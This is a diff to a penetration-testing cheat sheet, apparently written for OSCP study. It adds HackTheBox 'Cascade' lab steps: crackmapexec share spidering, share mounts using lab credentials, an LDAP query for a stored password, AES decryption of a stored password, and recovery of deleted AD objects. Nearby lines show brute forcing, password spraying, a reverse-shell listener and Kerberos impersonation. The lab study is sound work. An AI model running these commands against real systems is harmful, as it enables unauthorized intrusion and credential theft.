@@ -899,6 +899,7 @@ hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ss
 ## SMB enumeration
 - If don't find try RPC [RPC Enumeration](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#rpc-enumeration)
 - Rpcclient>querydispinfo for more info check above link RPC Enumeration
+- Recursively check the SMB shares with smbmap and crackmapexec
 
 ```powershell
 sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
@@ -950,6 +951,10 @@ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r --exclude SYSVOL,IPC
 sudo updatedb # Update the locate command
 locate Groups.xml # find the file
 
+# recursively check the smb shares using the crackmapexec
+crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2' -M spider_plus # Cascade HTB
+jq . /tmp/cme_spider_plus/10.10.10.182.json
+
 #Within SMB session
 put <file> #to upload file
 get <file> #to download file
@@ -975,6 +980,12 @@ mget *
 ## SMB to Mount
 - In the SMBCLIENT has the directory with .vhd file, using guestmount mounted to locally.
 - Reference IPPSEC HTB Bastion video
+```bash
+sudo mkdir /mnt/netlogon  # Create folder
+sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/NetLogon /mnt/netlogon # Cascade HTB
+```
+
+- Mount the directories and virtual disks, 7z list the files
 ```bash
 sudo apt-get install libguestfs-tools
 sudo apt-get install cifs-utils
@@ -1169,6 +1180,9 @@ nxc ldap 192.168.104.122 -u '' -p '' -M get-desc-users # Get users information i
 
 
 ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
+
+# password will be their some time in CTFs look for 'cascadeLegacyPwd'
+ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=Person)' | grep -i cascadeLegacyPwd  # cascade HTB
 
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -2275,6 +2289,29 @@ $object = [Activator]::CreateInstance($type)
 rlwrap nc -lvnp 4444 # GOT shell
 ```
 
+### Sqlite3 file.db
+- To view the .db files and dump .db files with sqlite3 utility in kali linux
+```bash
+sqlite3 Audit.db
+.tables;
+# you can dump all tables
+sqlite3 Audit.db .dump
+```
+
+#### password decrypt from .exe file
+- Password decrypt from the .exe key is stored on .db file
+- Transfer the .exe to windows box then chek the values, This is reference Cascade from HTB check the official writeup and [ippsed](https://www.youtube.com/watch?v=mr-fsVLoQGw)
+- Try on the python virtual environment to start `source /home/kali/HTB/HTB/Chaos/myenv/bin/activate`
+```powershell
+import pyaes
+from base64 import b64decode
+key = b"c4scadek3y654321"
+iv = b"1tdyjCbY1Ix49842"
+aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
+decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
+print(decrypted.decode())
+```
+
 ---
 
 # Linux Privilege Escalation
@@ -3133,6 +3170,7 @@ xfreerdp /u:administrator /p:'BJhN#,lU/9gvqN' /v:192.168.154.122 /smart-sizing:1
 ### crackmapexec
 
 - If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
+- If want recursively check the smb shares using the crackmapexec
 - If evil-winrm us not working for services try the username$ doller sign at end of user
 
 ```powershell
@@ -3140,6 +3178,10 @@ crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
 crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done
+
+# recursively check the smb shares using the crackmapexec
+crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2' -M spider_plus # Cascade HTB
+jq . /tmp/cme_spider_plus/10.10.10.182.json
 
 #Try --local-auth option if nothing comes up
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
@@ -3325,6 +3367,17 @@ python3 getST.py -spn cifs/resourcedc.resourced.local -impersonate Administrator
 export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
 sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.177.175
 ```
+
+### Active Directory Deleted Objects
+- I saw the SMB shares indicating that some temporary administrator user is deleted, in order to recover username and password
+- Reference Cascade HTB - [ippsec](https://www.youtube.com/watch?v=mr-fsVLoQGw)
+```powershell
+Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
+Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
+Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties * # try to decrypt the user with base64 
+```
+
+---
 # Public Exploit
 
 <aside>
